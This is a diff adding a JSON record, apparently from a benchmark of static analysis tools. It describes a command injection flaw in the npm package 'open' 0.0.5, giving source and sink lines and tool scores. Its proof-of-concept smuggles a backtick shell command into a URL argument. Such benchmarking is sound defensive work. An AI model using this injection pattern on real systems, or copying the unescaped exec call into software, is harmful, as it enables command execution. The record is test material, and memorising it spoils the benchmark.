@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": "GHSA-28xh-wpgr-7fm8",
+        "cwe": "CWE-78"
+    },
+    "correct_cwe": "CWE-78",
+    "correct_package_link": "https://registry.npmjs.org/open/-/open-0.0.5.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "lib/open.js",
+                    "lineno": 20,
+                    "code": "function open(target, appName, callback) {"
+                },
+                "sink": {
+                    "file": "lib/open.js",
+                    "lineno": 58,
+                    "code": "return exec(opener + ' \"' + escape(target) + '\"', callback);"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "require(\"open\")(\"http://example.com/`touch /tmp/tada`\");"
+        }
+    ],
+    "patch": [
+        {
+            "url": ""
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "C"
+        },
+        "appinspector": {
+            "score": "D"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "A"
+        }
+    }
+}
